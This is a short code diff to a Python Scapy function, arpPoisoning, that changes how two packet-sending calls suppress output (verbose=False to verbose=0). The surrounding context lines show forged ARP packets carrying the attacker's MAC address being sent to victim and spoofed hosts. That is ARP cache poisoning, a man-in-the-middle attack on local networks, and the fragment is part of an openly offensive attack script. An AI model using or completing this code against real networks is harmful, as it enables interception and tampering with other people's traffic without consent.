@@ -33,7 +33,7 @@ def arpPoisoning(victimIP, spoofIP, networkInterface):
                     pktV[ARP].hwdst = victimMAC[i]
                     pktV[ARP].pdst = victimIP[i]
 
-                    sendp(pktV, iface=networkInterface, verbose = False)
+                    sendp(pktV, iface=networkInterface, verbose = 0)
 
                     pktS = Ether() / ARP()
                     pktS[Ether].src = attackerMAC
@@ -42,7 +42,7 @@ def arpPoisoning(victimIP, spoofIP, networkInterface):
                     pktS[ARP].hwdst = spoofMAC[j]
                     pktS[ARP].pdst = spoofIP[j]
 
-                    sendp(pktS, iface=networkInterface, verbose = False)
+                    sendp(pktS, iface=networkInterface, verbose = 0)
 
                     
 #arpPoisoning([victimIP], [spoofIP], networkInterface)
